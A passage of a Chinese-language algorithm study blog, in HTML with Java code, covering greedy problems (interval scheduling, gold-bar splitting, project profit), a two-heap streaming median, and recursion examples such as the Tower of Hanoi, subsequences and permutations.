返回这个最多的宣讲场次。</p><blockquote><p>贪心策略：优先选择结束时间最早的</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Program</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> start<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> end<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Program</span><span class="token punctuation">(</span><span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">int</span> end<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> start<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>end <span class="token operator">=</span> end<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> programComparator <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Program</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Program</span> o1<span class="token punctuation">,</span> <span class="token class-name">Program</span> o2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> o1<span class="token punctuation">.</span>end <span class="token operator">-</span> o2<span class="token punctuation">.</span>end<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">bestArrange</span><span class="token punctuation">(</span><span class="token class-name">Program</span><span class="token punctuation">[</span><span class="token punctuation">]</span> programs<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>programs<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token function">programComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Program</span> each<span class="token operator">:</span>programs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>start<span class="token operator">&lt;=</span>each<span class="token punctuation">.</span>start<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            start <span class="token operator">=</span> each<span class="token punctuation">.</span>end<span class="token punctuation">;</span>            result<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-分金条"><a href="#0x02-分金条" class="headerlink" title="0x02 分金条"></a>0x02 分金条</h3><p>一块金条切成两半，是需要花费和长度数值一样的铜板的。比如长度为20的金条，不管切成长度多大的两半，都要花费20个铜板。 </p><p>一群人想整分整块金条，怎么分最省铜板? 例如,给定数组{10,20,30}，代表一共三个人，整块金条长度为10+20+30=60。 金条要分成10,20,30三个部分。 如果先把长度60的金条分成10和50，花费60； 再把长度50的金条分成20和30，花费50；一共花费110铜板。 但是如果先把长度60的金条分成30和30，花费60；再把长度30金条分成10和20， 花费30；一共花费90铜板。 </p><p>输入一个数组，返回分割的最小代价</p><blockquote><p>哈弗曼树思想，把数组放到小根堆中，每次用两个最小值，然后把和再次放入小根堆中，循环即可</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">lessMoney</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> pq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> each<span class="token operator">:</span>arr<span class="token punctuation">)</span> pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> temp<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>pq<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        temp <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> pq<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sum <span class="token operator">+=</span> temp<span class="token punctuation">;</span>        pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x03-项目最大收益"><a href="#0x03-项目最大收益" class="headerlink" title="0x03 项目最大收益"></a>0x03 项目最大收益</h3><p>输入：正数数组costs 正数数组profits 正数k 正数m</p><p>costs[i]表示i号项目的花费，profits[i]表示i号项目在扣除花费之后还能挣到的钱(利润)，k表示你只能串行的最多做k个项目，m表示你初始的资金</p><p>每做完一个项目，马上获得收益，可以支持你去做下一个项目</p><p>输出： 你最后获得的最大钱数</p><blockquote><p>小根堆用于存放按成本排列的项目，大根堆用于存放按利润排列的项目，每次从小根堆拿出基于目前已有的资金可以做的项目，放入大根堆中，然后拿出利润最大的一个，循环往复，直到做完k个项目或者拿不出可以做的项目而提前结束</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cost<span class="token punctuation">;</span>    <span class="token keyword">int</span> profit<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> cost<span class="token punctuation">,</span> <span class="token keyword">int</span> profit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cost <span class="token operator">=</span> cost<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>profit <span class="token operator">=</span> profit<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> minCost <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Node</span> o1<span class="token punctuation">,</span> <span class="token class-name">Node</span> o2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> o1<span class="token punctuation">.</span>cost <span class="token operator">-</span> o2<span class="token punctuation">.</span>cost<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> maxProfit <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Node</span> o1<span class="token punctuation">,</span> <span class="token class-name">Node</span> o2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> o2<span class="token punctuation">.</span>profit <span class="token operator">-</span> o1<span class="token punctuation">.</span>profit<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">maxGain</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> costs<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> profits<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Node</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">[</span>costs<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span> costs<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span>costs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> profits<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> pqCost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">minCost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> pqProfit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">maxProfit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> each<span class="token operator">:</span>nodes<span class="token punctuation">)</span> pqCost<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>pqCost<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> pqCost<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cost <span class="token operator">&lt;=</span> m<span class="token punctuation">)</span> pqProfit<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pqCost<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>pqProfit<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> m<span class="token punctuation">;</span>        m <span class="token operator">+=</span> pqProfit<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>profit<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> m<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-（不属于贪心）另一个大根堆小根堆结合的应用"><a href="#0x04-（不属于贪心）另一个大根堆小根堆结合的应用" class="headerlink" title="0x04 （不属于贪心）另一个大根堆小根堆结合的应用"></a>0x04 （不属于贪心）另一个大根堆小根堆结合的应用</h3><p>要求对给定数据流处理，随时可以取得中位数</p><p>第一个数进入大根堆，后面进来的数</p><p>1）&lt;= 大根堆顶，进入大根堆，否则进入小根堆</p><p>2）一旦大根堆和小根堆的size之差 =2，则将个数多的堆弹出放到另一个堆</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> medianHolder<span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> smallHeap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> bigHeap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">bigHeapComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">modifySize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> size1 <span class="token operator">=</span> smallHeap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> size2 <span class="token operator">=</span> bigHeap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>size1 <span class="token operator">-</span> size2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>size1 <span class="token operator">></span> size2<span class="token punctuation">)</span> bigHeap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>smallHeap<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> smallHeap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>bigHeap<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addNum</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>bigHeap<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> num <span class="token operator">&lt;=</span> bigHeap<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> bigHeap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> smallHeap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">modifySize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getMedian</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> size1 <span class="token operator">=</span> smallHeap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> size2 <span class="token operator">=</span> bigHeap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>size1 <span class="token operator">+</span> size2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> head1 <span class="token operator">=</span> smallHeap<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> head2 <span class="token operator">=</span> bigHeap<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size1 <span class="token operator">+</span> size2<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">(</span>head1 <span class="token operator">+</span> head2<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> size1 <span class="token operator">></span> size2 <span class="token operator">?</span> head1 <span class="token operator">:</span> head2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> bigHeapComparator <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> o1<span class="token punctuation">,</span> <span class="token class-name">Integer</span> o2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> o2 <span class="token operator">-</span> o1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="暴力递归"><a href="#暴力递归" class="headerlink" title="暴力递归"></a>暴力递归</h2><p>1，把问题转化为规模缩小了的同类问题的子问题 </p><p>2，有明确的不需要继续进行递归的条件(base case) </p><p>3，有当得到了子问题的结果之后的决策过程 </p><p>4，不记录每一个子问题的解</p><h3 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h3><p>打印n层汉诺塔从最左边移动到最右边的全部过程</p><p>假设函数为P(i, from, to, other)</p><p>一共i层，从from柱子移动到to柱子，other代表其他的柱子</p><p>整个递归过程即为</p><p>1）将1 - i-1层的圆盘移动到other柱子   P(i-1, from, other, to)</p><p>2）将i层圆盘移动到to柱子   打印即可</p><p>3）将1 - i-1层的圆盘移动到to柱子    P(i-1, other, to, from)</p><blockquote><p>不需要考虑中间比如第1步或者第3步移动的过程中怎么保证大圆盘没有放到小圆盘上，这个问题交给第1步或者第3步的递归过程即可</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hanoi</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">P</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token string">"left"</span><span class="token punctuation">,</span> <span class="token string">"right"</span><span class="token punctuation">,</span> <span class="token string">"mid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">P</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token class-name">String</span> from<span class="token punctuation">,</span> <span class="token class-name">String</span> <span class="token keyword">to</span><span class="token punctuation">,</span> <span class="token class-name">String</span> other<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Move 1 from "</span> <span class="token operator">+</span> from <span class="token operator">+</span> <span class="token string">" to "</span> <span class="token operator">+</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">P</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> from<span class="token punctuation">,</span> other<span class="token punctuation">,</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Move "</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> from <span class="token operator">+</span> <span class="token string">" to "</span> <span class="token operator">+</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">P</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> other<span class="token punctuation">,</span> <span class="token keyword">to</span><span class="token punctuation">,</span> from<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="子序列"><a href="#子序列" class="headerlink" title="子序列"></a>子序列</h3><p>打印字符串全部子序列，包括空字符串</p><p>从头开始，选择要该字符还是不要该字符，分出两条，随后分别递归</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm3_f3.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">allSubSequences</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span>chars<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> chars<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">process</span><span class="token punctuation">(</span>chars<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> tmp <span class="token operator">=</span> chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 0用于占位，代表不要该字符（前提是原来的字符串中没有这个ASCII码为0的字符，ASCII码为0的字符为空字符）</span>    chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span>chars<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h3><p>打印一个字符串的全部排列，要求不要出现重复的排列</p><p>0 - i-1 位置定好字符，从i位置之后的所有字符都可以放在i位置进行尝试（注意重复）, 定好i位置的字符，就进入下一层递归</p><p>process(int i, char[] chars)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">allPermutations</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> chars<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token 